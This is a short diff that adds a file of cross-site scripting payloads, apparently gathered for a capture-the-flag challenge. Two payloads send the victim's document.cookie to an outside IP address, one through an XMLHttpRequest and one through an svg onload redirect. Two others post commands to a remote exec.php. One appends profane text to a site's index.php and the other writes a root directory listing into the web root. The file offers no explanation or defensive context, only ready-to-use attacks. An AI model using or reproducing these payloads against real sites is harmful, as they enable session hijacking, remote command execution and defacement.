@@ -1,0 +1,16 @@
+<script>
+  xhr = new XMLHttpRequest();
+  xhr.open('get', 'http://119.29.88.66:33333/' + document.cookie);
+  xhr.send();
+</script>
+
+<svg onload
+="xhr = new XMLHttpRequest();xhr.open('post', 'http://ctf3.linkedbyx.com:11291/exec.php');xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');xhr.send(encodeURI('command=echo fuck >> /var/www/html/index.php&exec=1'));" ></svg>
+
+<script>
+    xhr = new XMLHttpRequest();xhr.open('post', 'http://ctf3.linkedbyx.com:11291/exec.php');xhr.send(encodeURI('command=ls / > /var/www/html/fuck.txt&exec=1'));
+</script>
+
+<svg onload
+=window.location.href='//119.29.88.66/'+document.cookie></svg>
+
